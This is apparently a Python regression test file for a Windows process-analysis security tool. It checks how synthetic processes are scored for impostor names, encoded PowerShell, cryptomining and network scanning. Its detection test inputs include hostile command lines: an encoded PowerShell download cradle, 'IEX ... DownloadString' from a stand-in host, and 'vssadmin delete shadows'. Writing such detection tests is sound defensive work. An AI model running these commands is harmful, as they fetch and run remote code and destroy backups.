"""Cenários da análise de processos (v1.3.0). Tudo sintético/inerte: nenhum malware, nenhum acesso a rede. Importado por run_regression.py."""
from __future__ import annotations

import os
import subprocess
import sys
import time

BS = chr(92)
WIN = os.path.normpath(os.environ.get("SystemRoot", "C:" + BS + "Windows"))
SYS32 = WIN + BS + "System32"
TEMP_EXE = os.path.join(os.environ.get("TEMP", "C:" + BS + "Temp"), "x")


def run_round4(ctx) -> None:
    check = ctx.check
    from sentinela import procscan as ps
    from sentinela.scoring import Finding

    NOW = 1_700_000_000.0
    UNSIGNED = {"status": "NotSigned", "verified": True, "subject": "", "issuer": "", "thumb": ""}
    SIGNED = {"status": "Valid", "verified": True, "subject": 'CN="Foo Games", O=Foo Games Inc, L=Oslo, C=NO', "issuer": "CN=DigiCert Trusted G4", "thumb": "AA"}
    MS = {"status": "Valid", "verified": True, "subject": "CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
          "issuer": "CN=Microsoft Windows Production PCA 2011", "thumb": "BB"}

    def mk(name, exe, sig=None, **kw):
        p = ps.Proc(pid=kw.pop("pid", 1000), name=name, exe=exe, cmdline=kw.pop("cmd", ""), ppid=kw.pop("ppid", 4),
                    create_time=kw.pop("ct", NOW + 10))
        p.sig = {"unsigned": UNSIGNED, "signed": SIGNED, "ms": MS}.get(sig, sig) if isinstance(sig, (str, type(None))) else sig
        for k, v in kw.items():
            setattr(p, k, v)
        return p

    def scan(procs, **cx):
        c = ps.Ctx(**cx) if cx else ps.Ctx()
        c.ncores = cx.get("ncores", 16) if cx else 16
        ps.analyze_all(procs, c)
        return procs

    def pts(p):
        return sum(f.points for f in p.findings if f.points > 0)

    def titles(p):
        return " | ".join(f.title for f in p.findings)

    def one(name, exe, sig, cx=None, **kw):
        p = mk(name, exe, sig, **kw)
        scan([p], **(cx or {}))
        return p

    # ------------------------------------------------ identidade
    p = one("svchost.exe", TEMP_EXE + BS + "svchost.exe", "unsigned")
    check("P1 svchost fora do System32 => Perigoso (high)", p.level == "danger" and "fora do local" in titles(p), f"{p.level} {p.score} {titles(p)}")
    p = one("lsass.exe", TEMP_EXE + BS + "lsass.exe", "unsigned")
    check("P1 lsass fora do System32 => critical", any(f.severity == "critical" for f in p.findings) and p.level == "danger")
    p = one("svchost.exe", SYS32 + BS + "svchost.exe", "ms", ppid=500)
    svc = mk("services.exe", SYS32 + BS + "services.exe", "ms", pid=500, ct=NOW)
    p = mk("svchost.exe", SYS32 + BS + "svchost.exe", "ms", ppid=500, ct=NOW + 5)
    scan([svc, p])
    check("N1 svchost legítimo (System32, pai services) => sem pontos", pts(p) == 0 and p.level == "ok", titles(p))
    expl = mk("explorer.exe", TEMP_EXE + BS + "explorer.exe", "unsigned", pid=600, ct=NOW)
    p = mk("svchost.exe", SYS32 + BS + "svchost.exe", "ms", ppid=600, ct=NOW + 5)
    scan([expl, p])
    check("P2 svchost iniciado por explorer => pai inesperado", "inesperado" in titles(p), titles(p))
    p = mk("svchost.exe", SYS32 + BS + "svchost.exe", "ms", ppid=700, ct=NOW + 5)
    scan([p])
    check("N2 pai ausente (já encerrado) não gera alerta", pts(p) == 0)
    newer = mk("explorer.exe", WIN + BS + "explorer.exe", "ms", pid=800, ct=NOW + 99)
    p = mk("svchost.exe", SYS32 + BS + "svchost.exe", "ms", ppid=800, ct=NOW + 5)
    scan([newer, p])
    check("N3 PID reutilizado (pai mais novo que o filho) é ignorado", pts(p) == 0, titles(p))
    p = one("WmiPrvSE.exe", SYS32 + BS + "wbem" + BS + "WmiPrvSE.exe", "ms")
    check("N4 WmiPrvSE em System32\\wbem é legítimo", pts(p) == 0, titles(p))
    for nm in ("sihost.exe", "dwm.exe", "taskhost.exe", "sms.exe", "ctfmon.exe", "lsm.exe", "fontdrvhost.exe"):
        p = one(nm, SYS32 + BS + nm, "ms")
        check(f"N5 nome legítimo curto/parecido {nm} não dispara", pts(p) == 0, titles(p))
    p = one("sv" + chr(0x0441) + "host.exe", TEMP_EXE + BS + "x.exe", "unsigned")
    check("P3 'svсhost' com cirílico => imita processo do Windows", "imita" in titles(p) and p.level == "danger", titles(p))
    p = one("s" + chr(0x200b) + "vchost.exe", TEMP_EXE + BS + "x.exe", "unsigned")
    check("P3 nome com zero-width => imita", "imita" in titles(p), titles(p))
    p = one("scvhost.exe", TEMP_EXE + BS + "x.exe", "unsigned")
    check("P3 'scvhost' (letras trocadas) => quase igual", "quase igual" in titles(p), titles(p))
    p = one("svch0st.exe", TEMP_EXE + BS + "x.exe", "unsigned")
    check("P3 'svch0st' (zero no lugar do o) => imita", pts(p) >= 45, titles(p))
    p = one("日本語の改造.exe", "D:" + BS + "mods" + BS + "x.exe", "unsigned")
    check("N6 nome CJK de mod não é confundido com nome do sistema", pts(p) == 0, titles(p))

    # ------------------------------------------------ arquivo / origem
    p = one("evil.exe", TEMP_EXE + BS + "evil.exe", "unsigned", exists=False)
    check("P4 exe apagado, sem assinatura, em pasta de risco => high", p.level == "danger" or pts(p) >= 40, titles(p))
    p = one("Discord.exe", os.environ.get("LOCALAPPDATA", "C:" + BS + "x") + BS + "Discord" + BS + "app" + BS + "Discord.exe", "signed", exists=False)
    check("N7 exe apagado de app assinado (atualizador) => só informação", pts(p) == 0 and p.level == "ok", titles(p))
    p = one("a.exe", BS * 2 + "srv" + BS + "share" + BS + "a.exe", None, kind="remote")
    check("P5 exe em local remoto => medium e sem abrir o arquivo", "remoto" in titles(p) and p.status == "remote", titles(p))
    p = one("trainer.exe", "C:" + BS + "Users" + BS + "u" + BS + "Downloads" + BS + "trainer.exe", "unsigned")
    check("N8 trainer sem assinatura em Downloads, sozinho => só informação (0 pontos)", pts(p) == 0 and p.level == "ok", titles(p))
    p = one("trainer.exe", "C:" + BS + "Users" + BS + "u" + BS + "Downloads" + BS + "trainer.exe", "unsigned", remote_ips={"8.8.8.8"})
    check("P6 ...com conexão externa e sem janela => medium", p.level == "caution" and pts(p) == 20, f"{p.level} {pts(p)} {titles(p)}")
    p = one("trainer.exe", "C:" + BS + "Users" + BS + "u" + BS + "Downloads" + BS + "trainer.exe", "unsigned", remote_ips={"8.8.8.8"},
            persist=["Run: x"])
    check("P6 ...com rede + persistência => high", pts(p) >= 40, f"{pts(p)} {titles(p)}")
    p = one("trainer.exe", "C:" + BS + "Users" + BS + "u" + BS + "Downloads" + BS + "trainer.exe", "unsigned", remote_ips={"8.8.8.8"}, has_window=True)
    check("N9 ...com janela visível a conexão não conta como sinal", pts(p) == 0, titles(p))
    p = one("Game.exe", "C:" + BS + "Program Files" + BS + "Game" + BS + "Game.exe", "unsigned", remote_ips={"8.8.8.8"}, persist=["Run: g"])
    check("N10 sem assinatura em Program Files com rede e persistência => só informação", pts(p) == 0, titles(p))
    p = one("a.exe", TEMP_EXE + BS + "a.exe", "unsigned", stat0=(10, 1), stat1=(11, 2))
    check("P7 exe sem assinatura que mudou durante a janela => medium", "alterado" in titles(p) and pts(p) >= 20, titles(p))
    p = one("a.exe", "C:" + BS + "Program Files" + BS + "A" + BS + "a.exe", "signed", stat0=(10, 1), stat1=(11, 2))
    check("N11 exe assinado atualizado durante a janela => sem pontos", pts(p) == 0)
    p = one("a.exe", "C:" + BS + "Program Files" + BS + "A" + BS + "a.exe", {"status": "HashMismatch", "verified": True, "subject": "CN=X", "issuer": "", "thumb": ""})
    check("P8 assinatura com HashMismatch => medium", pts(p) >= 25, titles(p))
    p = one("a.exe", "C:" + BS + "Program Files" + BS + "A" + BS + "a.exe", {"status": "CheckFailed", "verified": False, "subject": "", "issuer": "", "thumb": ""})
    check("N12 verificação de assinatura que FALHOU não vira 'não assinado'", p.status == "failed" and pts(p) == 0, f"{p.status} {titles(p)}")
    p = one("WhatsApp.Root.exe", "C:" + BS + "Program Files" + BS + "WindowsApps" + BS + "x" + BS + "w.exe", "unsigned")
    check("N13 app empacotado (WindowsApps) é tratado como verificado", p.status == "verified", p.status)

    # ------------------------------------------------ linha de comando
    enc = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
    p = one("powershell.exe", SYS32 + BS + "WindowsPowerShell" + BS + "v1.0" + BS + "powershell.exe", "ms",
            cmd="powershell.exe -NoP -W Hidden -enc " + enc)
    check("P9 powershell -enc com base64 longo => high", any("codificado" in f.title for f in p.findings) and pts(p) >= 30, titles(p))
    p = one("powershell.exe", SYS32 + BS + "WindowsPowerShell" + BS + "v1.0" + BS + "powershell.exe", "ms", cmd="powershell -enc " + enc)
    check("P9 'powershell -enc <base64>' simples (sem outros parâmetros) => high", any("codificado" in f.title for f in p.findings), titles(p))
    p = one("updater.exe", TEMP_EXE + BS + "updater.exe", "signed", cmd="updater.exe /c powershell -enc " + enc)
    check("P9 cópia renomeada de shell em pasta de usuário também é analisada", any("codificado" in f.title for f in p.findings), titles(p))
    p = one("bash.exe", "C:" + BS + "Program Files" + BS + "Git" + BS + "bin" + BS + "bash.exe", "unsigned",
            cmd="bash -c \"echo 'powershell -enc " + enc + "' ; vssadmin delete shadows\"")
    check("N13b shell em Program Files cuja linha de comando só CONTÉM o texto suspeito (heredoc/script) não dispara", pts(p) == 0, titles(p))
    p = one("cmd.exe", SYS32 + BS + "cmd.exe", "ms", cmd="cmd /c vssadmin delete shadows /all /quiet")
    check("P9 vssadmin delete shadows => crítico", p.level == "danger" and any(f.severity == "critical" for f in p.findings))
    p = one("powershell.exe", SYS32 + BS + "WindowsPowerShell" + BS + "v1.0" + BS + "powershell.exe", "ms",
            cmd="powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a.ps1')\"")
    check("P9 powershell baixando e executando URL => high", any("baixando e executando" in f.title for f in p.findings), titles(p))
    p = one("powershell.exe", SYS32 + BS + "WindowsPowerShell" + BS + "v1.0" + BS + "powershell.exe", "ms",
            cmd="powershell -NoProfile -Command \"$s = $env:X; Invoke-Expression -Command $s\"")
    check("N14 Invoke-Expression sozinho (automação) NÃO dispara", pts(p) == 0, titles(p))
    p = one("python.exe", "C:" + BS + "Python" + BS + "python.exe", "signed", cmd="python -e " + "a" * 40)
    check("N15 'python -e <texto longo>' não é PowerShell codificado", pts(p) == 0, titles(p))
    p = one("ffmpeg.exe", "C:" + BS + "tools" + BS + "ffmpeg.exe", "signed", cmd="ffmpeg -a 1 --algo x --coin y -i in.mp4 out.mp4")
    check("N16 ffmpeg/7z com -a/--algo/--coin não é minerador", pts(p) == 0, titles(p))
    t0 = time.time()
    p = one("powershell.exe", SYS32 + BS + "WindowsPowerShell" + BS + "v1.0" + BS + "powershell.exe", "ms",
            cmd=("powershell " + "A" * 32000)[:ps.CMD_LIMIT] + "x" * 100)
    big = mk("p.exe", TEMP_EXE + BS + "p.exe", "unsigned", cmd="powershell " + "-e " * 8000 + "A" * 30000)
    scan([big])
    check("N17 cmdline de 32 KB hostil: sem lentidão (ReDoS)", time.time() - t0 < 1.5, f"{time.time() - t0:.2f}s")
    wd = mk("winword.exe", "C:" + BS + "Program Files" + BS + "Office" + BS + "winword.exe", "ms", pid=900, ct=NOW)
    sh = mk("powershell.exe", SYS32 + BS + "WindowsPowerShell" + BS + "v1.0" + BS + "powershell.exe", "ms", pid=901, ppid=900, ct=NOW + 3)
    scan([wd, sh])
    check("P10 Word abrindo PowerShell => medium", "abriu" in titles(sh) and sh.level == "caution", titles(sh))

    # ------------------------------------------------ mineração
    p = one("xmrig.exe", TEMP_EXE + BS + "xmrig.exe", "unsigned")
    check("P11 nome xmrig sozinho (sem pool/parâmetros/consumo) => só Atenção, nunca Perigoso", p.level == "caution" and pts(p) == 30, f"{p.level} {pts(p)} {titles(p)}")
    p = one("xmrig.exe", TEMP_EXE + BS + "xmrig.exe", "unsigned", cx={"window": 80}, cpu=[100.0] * 40)
    check("P11 nome xmrig + consumo contínuo => high", p.level == "danger" and "mineração" in titles(p), f"{p.level} {titles(p)}")
    p = one("t-rex_runner.exe", "C:" + BS + "Games" + BS + "t-rex_runner.exe", "signed")
    check("N29 jogo indie 't-rex_runner' assinado => no máximo Atenção (nunca Perigoso)", p.level != "danger", f"{p.level} {titles(p)}")
    p = one("update.exe", TEMP_EXE + BS + "update.exe", "unsigned", cmd="update.exe -o stratum+tcp://pool.test:3333 -u wallet")
    check("P11 parâmetros stratum (nome disfarçado) => high", "mineração" in titles(p), titles(p))
    xmr = "4" + "A" + "B" * 93
    p = one("a.exe", TEMP_EXE + BS + "a.exe", "unsigned", cmd="a.exe --user " + xmr)
    check("P11 endereço de carteira Monero na cmdline => high", "mineração" in titles(p), titles(p))
    dns = {"1.2.3.4": {"xmr.nanopool.org"}}
    p = one("a.exe", "C:" + BS + "Program Files" + BS + "A" + BS + "a.exe", "unsigned", cx={"dns": dns}, remote_ips={"1.2.3.4"})
    check("P12 sem assinatura + DNS de pool => Atenção (30), nunca Perigoso só pelo DNS", "pool" in titles(p) and p.level == "caution" and pts(p) == 30, f"{p.level} {titles(p)}")
    p = one("Discord.exe", "C:" + BS + "Users" + BS + "u" + BS + "AppData" + BS + "Local" + BS + "Discord" + BS + "Discord.exe", "signed", cx={"dns": {"104.18.1.1": {"eth.2miners.com"}}}, remote_ips={"104.18.1.1"})
    check("N30 app assinado em IP de CDN que está no DNS como pool => sem pontos", pts(p) == 0 and p.level == "ok", titles(p))
    p = one("chrome.exe", "C:" + BS + "Program Files" + BS + "Google" + BS + "chrome.exe", "signed", cx={"dns": dns}, remote_ips={"1.2.3.4"})
    check("N18 navegador no site de uma pool => só informação", pts(p) == 0, titles(p))
    p = one("a.exe", "C:" + BS + "Program Files" + BS + "A" + BS + "a.exe", "unsigned", remote_ports={3333})
    check("N19 porta 3333 sozinha => nada", pts(p) == 0, titles(p))
    full = [100.0] * 40
    p = one("hog.exe", "C:" + BS + "Users" + BS + "u" + BS + "hog.exe", "unsigned", cx={"window": 80}, cpu=full)
    check("P13 1 núcleo a 100% por 80 s em programa sem assinatura => medium", "Consumo" in titles(p) and pts(p) == 20, titles(p))
    p = one("hog.exe", "C:" + BS + "Users" + BS + "u" + BS + "hog.exe", "unsigned", cx={"window": 80}, cpu=full, remote_ports={3333})
    check("P13 ...com porta de pool => Atenção (35), não Perigoso", p.level == "caution" and pts(p) == 35, f"{p.level} {pts(p)} {titles(p)}")
    p = one("game.exe", "C:" + BS + "Users" + BS + "u" + BS + "game.exe", "unsigned", cx={"window": 80}, cpu=full, remote_ports={7777})
    check("N31 jogo sem assinatura a 100% de um núcleo na porta 7777 => no máximo Atenção (7777 não é porta de pool)", p.level != "danger" and pts(p) <= 20, f"{p.level} {pts(p)}")
    p = one("game.exe", "C:" + BS + "Users" + BS + "u" + BS + "game.exe", "unsigned", cx={"window": 80}, cpu=full, has_window=True, foreground=True, remote_ports={3333})
    check("N31 jogo em primeiro plano não é tratado como minerador", p.level == "ok" and pts(p) == 0, f"{p.level} {pts(p)}")
    p = one("hog.exe", "C:" + BS + "Users" + BS + "u" + BS + "hog.exe", "unsigned", cx={"window": 30}, cpu=[100.0] * 15)
    check("N20 janela de 30 s não pontua consumo", pts(p) == 0, titles(p))
    p = one("cl.exe", "C:" + BS + "VS" + BS + "cl.exe", "signed", cx={"window": 80}, cpu=full)
    check("N21 compilador assinado a 100% => sem pontos", pts(p) == 0, titles(p))
    p = one("hog.exe", "C:" + BS + "Users" + BS + "u" + BS + "hog.exe", "unsigned", cx={"window": 80}, cpu=[40.0] * 40)
    check("N22 programa sem assinatura a 40% de um núcleo => sem pontos", pts(p) == 0, titles(p))
    p = one("miner.exe", "C:" + BS + "Users" + BS + "u" + BS + "miner.exe", "unsigned", cx={"window": 80}, gpu_compute=[90.0] * 40)
    check("P14 GPU compute sustentada em programa sem assinatura => medium", pts(p) == 20, titles(p))
    p = one("game.exe", "C:" + BS + "Users" + BS + "u" + BS + "game.exe", "unsigned", cx={"window": 80}, gpu_3d=[99.0] * 40)
    check("N23 GPU 3D alta (jogo) => sem pontos", pts(p) == 0, titles(p))
    p = one("hog.exe", "C:" + BS + "Users" + BS + "u" + BS + "hog.exe", "unsigned", cx={"window": 80, "trusted": {"x": 1}}, cpu=full, sha256="abc")
    check("N24 sem confiança: consumo continua valendo (controle do teste de 'Confiar')", pts(p) == 20)
    p = one("xmrig.exe", TEMP_EXE + BS + "xmrig.exe", "unsigned", cx={"trusted": {"abc": {"motivo": "eu instalei"}}}, sha256="abc")
    check("N25 'Confiar' (SHA-256) suprime o alerta do minerador", pts(p) == 0 and p.status == "user", f"{p.status} {titles(p)}")
    p = one("xmrig.exe", TEMP_EXE + BS + "xmrig.exe", "unsigned", cx={"trusted": {"abc": {}}}, sha256="abc", cmd="cmd /c vssadmin delete shadows /all")
    check("N25 'Confiar' NÃO apaga alerta crítico de linha de comando", any(f.severity == "critical" for f in p.findings))

    # ------------------------------------------------ rede / botnet
    p = one("w.exe", TEMP_EXE + BS + "w.exe", "unsigned", syn=[0, 120, 130, 0], syn_nets={f"10.{i}.0" for i in range(30)})
    check("P15 >100 SYN_SENT em /24 distintos (varredura) => high", "varredura" in titles(p) and p.level == "danger", titles(p))
    p = one("w.exe", TEMP_EXE + BS + "w.exe", "unsigned", scan_ips={f"1.1.{i}.1" for i in range(250)})
    check("P15 250 IPs em portas de varredura => high", "varredura" in titles(p))
    p = one("qbittorrent.exe", "C:" + BS + "tools" + BS + "qb.exe", "unsigned", remote_ips={f"5.5.{i % 250}.{i // 250}" for i in range(300)}, has_window=True)
    check("N26 torrent com 300 conexões estabelecidas => nada", pts(p) == 0, titles(p))
    p = one("bot.exe", TEMP_EXE + BS + "bot.exe", "unsigned", remote_ports={6667})
    check("P16 porta IRC por programa sem assinatura => medium", pts(p) >= 20, titles(p))
    p = one("tor.exe", "C:" + BS + "Tor" + BS + "tor.exe", "signed", remote_ports={9001})
    check("N27 Tor Browser (assinado) em 9001 => nada", pts(p) == 0, titles(p))
    p = one("srv.exe", TEMP_EXE + BS + "srv.exe", "unsigned", listen_public={51234})
    check("P17 sem assinatura, em pasta de risco, sem janela, escutando porta alta => medium", pts(p) == 20, titles(p))
    p = one("srv.exe", "C:" + BS + "Program Files" + BS + "S" + BS + "srv.exe", "unsigned", listen_public={25565})
    check("N28 servidor de jogo sem assinatura em Program Files => só informação", pts(p) == 0, titles(p))

    # ------------------------------------------------ veredito geral
    good = [mk("a.exe", "C:" + BS + "Program Files" + BS + "A" + BS + "a.exe", "signed", pid=10 + i) for i in range(3)]
    scan(good)
    v = ps.scan_verdict(good, [], [])
    check("V1 tudo assinado, sem lacunas => 'Sem indícios (parcial)', nunca 'Seguro' absoluto", v.level == "safe" and "parcial" in v.headline, v.headline)
    v = ps.scan_verdict(good, [], [ps.gap("1 processo sem assinatura")])
    check("V2 com lacuna relevante => Inconclusivo", v.level == "unknown", v.headline)
    bad = [mk("xmrig.exe", TEMP_EXE + BS + "xmrig.exe", "unsigned", cmd="xmrig -o stratum+tcp://p.test:3333")]
    scan(bad)
    check("V3 minerador => Perigoso", ps.scan_verdict(bad, [], []).level == "danger")
    mach = [Finding("machine", "Proteção em tempo real desligada", "", 40, "high")]
    check("V4 Defender desligado => pelo menos Atenção", ps.scan_verdict(good, mach, []).level in ("caution", "danger"))

    # ------------------------------------------------ texto hostil
    nasty = "a" + chr(0x202e) + "b" + chr(0x200b) + chr(0xfeff) + chr(0xe0041) + "c" + chr(10) + "d" + chr(0) + "e<img src=" + BS * 2 + "x" + BS + "y>"
    out = ps.clean_text(nasty)
    check("H1 clean_text remove bidi/zero-width/BOM/tag chars/controles/quebras", all(ord(c) >= 32 and c not in (chr(0x202e), chr(0x200b), chr(0xfeff), chr(0xe0041)) for c in out) and "\n" not in out, repr(out))
    check("H2 clean_text trunca cedo", len(ps.clean_text("x" * 5000, 100)) <= 100)
    p = one(nasty + ".exe", TEMP_EXE + BS + "x.exe", "unsigned", cmd=nasty * 50)
    texts = [f.title + f.detail for f in p.findings]
    import unicodedata
    bad_cats = {"Cc", "Cf", "Cs", "Co", "Cn"}
    check("H3 achados de processo com nome/cmdline hostis não carregam controles/bidi/zero-width",
          texts and all(unicodedata.category(c) not in bad_cats for s in texts for c in s))
    check("H4 redact: segredos e nome do usuário",
          "hunter2" not in ps.redact("x --password hunter2") and "s3cr3t" not in ps.redact("https://u:s3cr3t@h/p?apikey=zz") and "zz" not in ps.redact("?apikey=zz"))

    # ------------------------------------------------ caminhos, persistência, DNS, GPU, Defender, hosts
    check("C1 path_kind: UNC é remoto, disco do Windows é local", ps.path_kind(BS * 2 + "srv" + BS + "s" + BS + "a.exe") == "remote" and ps.path_kind(WIN + BS + "x.exe") == "local")
    tg = ps.command_targets('"C:' + BS + 'Program Files' + BS + 'A' + BS + 'a.exe" --silent')
    check("C2 command_targets: caminho entre aspas", ps.norm_path("C:" + BS + "Program Files" + BS + "A" + BS + "a.exe") in tg, str(tg))
    tg = ps.command_targets("%SystemRoot%" + BS + "system32" + BS + "svchost.exe -k netsvcs")
    check("C2 command_targets: variável de ambiente + argumentos", ps.norm_path(SYS32 + BS + "svchost.exe") in tg, str(tg))
    tg = ps.command_targets("C:" + BS + "Users" + BS + "u" + BS + "AppData" + BS + "app.exe /background")
    check("C2 command_targets: sem aspas", ps.norm_path("C:" + BS + "Users" + BS + "u" + BS + "AppData" + BS + "app.exe") in tg, str(tg))
    gpu = ps.parse_gpu_output("#" + chr(10) + "pid_100_luid_0x0_0x1_phys_0_eng_0_engtype_3D|55,5" + chr(10) + "pid_100_luid_0x0_0x1_phys_0_eng_2_engtype_Compute_0|90"
                              + chr(10) + "pid_100_luid_0x0_0x1_phys_0_eng_3_engtype_Cuda|70" + chr(10) + "#" + chr(10) + "pid_100_luid_0x0_0x1_phys_0_eng_0_engtype_3D|10" + chr(10))
    check("G1 GPU: máximo por tipo (não soma) e 3D separado de compute", gpu.get(100) == [(55.5, 90.0), (10.0, 0.0)], str(gpu))
    fs, gaps, ok = ps.defender_findings('{"ok":true,"rt":true,"age":2,"tamper":true,"mode":"Normal","excl":"N/A: Must be an administrator to view exclusions"}')
    check("D1 exclusões 'N/A' = não legíveis (nunca 'sem exclusões')", ok is False and not fs and not gaps, str((fs, gaps, ok)))
    fs, gaps, ok = ps.defender_findings('{"ok":true,"rt":false,"age":40,"tamper":false,"mode":"Normal","excl":["C:\\\\x"]}')
    check("D2 Defender: tempo real off, assinaturas velhas, exclusão legível", ok and any(f.points >= 40 for f in fs) and any("dias" in f.title for f in fs) and any("exclus" in f.title for f in fs), str([f.title for f in fs]))
    fs, gaps, ok = ps.defender_findings('{"ok":true,"rt":false,"age":1,"tamper":true,"mode":"Passive Mode","excl":null}')
    check("D3 Defender em modo passivo (outro antivírus) não é alarme", not any(f.points > 0 for f in fs), str([f.title for f in fs]))
    fs, gaps, ok = ps.defender_findings(None)
    check("D4 falha ao consultar o Defender => lacuna", len(gaps) == 1)
    h = ps.hosts_findings("127.0.0.1 localhost" + chr(10) + "0.0.0.0 ads.example.com" + chr(10) + "127.0.0.1 update.microsoft.com" + chr(10))
    check("D5 hosts bloqueando Microsoft/antivírus => medium; anúncios comuns não", len(h) == 1 and h[0].points == 25)
    check("D5 hosts só com bloqueio de anúncios => nada", ps.hosts_findings("0.0.0.0 ads.example.com" + chr(10) + "# microsoft.com") == [])

    # ------------------------------------------------ ações
    me = mk("python.exe", sys.executable, "signed", pid=os.getpid())
    check("A1 não age no próprio Sentinela", bool(ps.action_block_reason(me)))
    for nm in ("explorer.exe", "csrss.exe", "lsass.exe", "svchost.exe", "System"):
        check(f"A2 Encerrar/Suspender recusa {nm}", bool(ps.action_block_reason(mk(nm, SYS32 + BS + nm, "ms", pid=2000))))
    check("A3 PID 4 recusado", bool(ps.action_block_reason(mk("System", "", None, pid=4))))
    check("A4 programa comum de usuário pode ser alvo", ps.action_block_reason(mk("trainer.exe", "C:" + BS + "Users" + BS + "u" + BS + "t.exe", "unsigned", pid=5000)) == "")
    check("A5 antivírus/anticheat gera aviso", bool(ps.action_warning(mk("vgc.exe", "C:" + BS + "Riot" + BS + "vgc.exe", "signed"))) and not ps.action_warning(mk("a.exe", "C:" + BS + "a.exe", "signed")))
    import psutil
    sleeper = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(120)"])
    try:
        time.sleep(0.6)
        ct = psutil.Process(sleeper.pid).create_time()
        target = mk("python.exe", sys.executable, "signed", pid=sleeper.pid, ct=ct)
        wrong = mk("python.exe", sys.executable, "signed", pid=sleeper.pid, ct=ct - 500)
        msg = ps.act_on_process(wrong, "terminate")
        check("A6 create_time diferente (PID reutilizado) => NÃO encerra", "mudou" in msg and sleeper.poll() is None, msg)
        msg = ps.act_on_process(target, "suspend")
        check("A7 suspender confere identidade e funciona", msg == "", msg)
        msg2 = ps.act_on_process(target, "resume")
        check("A7 retomar funciona", msg2 == "", msg2)
        msg = ps.act_on_process(target, "terminate")
        time.sleep(0.5)
        check("A8 encerrar com identidade correta funciona", msg == "" and sleeper.poll() is not None, msg)
    finally:
        if sleeper.poll() is None:
            sleeper.kill()

    # ------------------------------------------------ reauditoria (B1–B9)
    p = one("service.exe", "C:" + BS + "Program Files" + BS + "Foo" + BS + "service.exe", "signed")
    check("B1 'service.exe' de terceiro assinado não é 'nome parecido'", pts(p) == 0, titles(p))
    p = one("service.exe", "C:" + BS + "Users" + BS + "u" + BS + "x" + BS + "service.exe", "unsigned")
    check("B1 nome parecido (sem assinatura, fora do Windows) => Atenção, jamais Perigoso", p.level == "caution" and pts(p) == 25, f"{p.level} {pts(p)}")
    for nm in ("csrs.exe", "lsasss.exe", "svchost.scr", "svchost.com", "smss1.exe"):
        p = one(nm, TEMP_EXE + BS + nm, "unsigned")
        check(f"B6 {nm} (evasão de nome) é detectado", pts(p) >= 25, titles(p))
    p = one("sv" + chr(0x3164) + "chost.exe", TEMP_EXE + BS + "x.exe", "unsigned")
    check("B6 svchost com preenchimento Hangul (U+3164) é detectado", "imita" in titles(p) or "quase" in titles(p), titles(p))
    check("B6 clean_text remove invisíveis U+3164/U+2800/seletor de variação", ps.clean_text("a" + chr(0x3164) + chr(0x2800) + chr(0xFE0F) + "b") == "ab")
    p = mk("svchost.exe", TEMP_EXE + BS + "svchost.exe", "unsigned", pid=3000)
    check("B7 Encerrar/Suspender HABILITADO para o impostor svchost em Temp", ps.action_block_reason(p) == "", ps.action_block_reason(p))
    check("B7 ...mas continua bloqueado para o svchost real", bool(ps.action_block_reason(mk("svchost.exe", SYS32 + BS + "svchost.exe", "ms", pid=3001))))
    p = one("nicehash.exe", "C:" + BS + "Program Files" + BS + "NiceHash" + BS + "nicehash.exe", "signed", cmd="nicehash -o stratum+tcp://p.test:3333", sha256="ff" * 32)
    check("B5 minerador assinado tem SHA-256 disponível para 'Confiar' (campo preenchido pelo scan)", p.level == "danger" and p.sha256 != "")
    p = one("python.exe", "C:" + BS + "Python" + BS + "python.exe", "unsigned", cx={"trusted": {"cd" * 32: {}}}, sha256="cd" * 32, cmd="python -c x vssadmin delete shadows")
    check("B8 'Confiar' em interpretador (python) é ignorado: alertas continuam", p.status != "user" and any(f.severity == "critical" for f in p.findings), p.status)
    pad = chr(10) * 6000 + "0.0.0.0 update.microsoft.com" + chr(10)
    check("B9 hosts: entrada depois da linha 5000 é encontrada", len(ps.hosts_findings(pad)) == 1)
    check("B9 hosts: telemetria da Microsoft (privacidade) não gera alerta", ps.hosts_findings("0.0.0.0 vortex.data.microsoft.com" + chr(10) + "0.0.0.0 watson.telemetry.microsoft.com") == [])
    p = one("powershell.exe", SYS32 + BS + "WindowsPowerShell" + BS + "v1.0" + BS + "powershell.exe", "ms", cmd="powershell -ec " + enc)
    check("R1 powershell -ec <base64> também é detectado", any("codificado" in f.title for f in p.findings), titles(p))
    check("R2 pasta Temp do Windows não conta como pasta Microsoft confiável",
          not ps.is_microsoft(mk("a.exe", WIN + BS + "Temp" + BS + "a.exe", "ms")))
    check("R3 RAM disk (tipo 6) é tratado como local", ps.path_kind("C:" + BS + "x.exe") == "local")
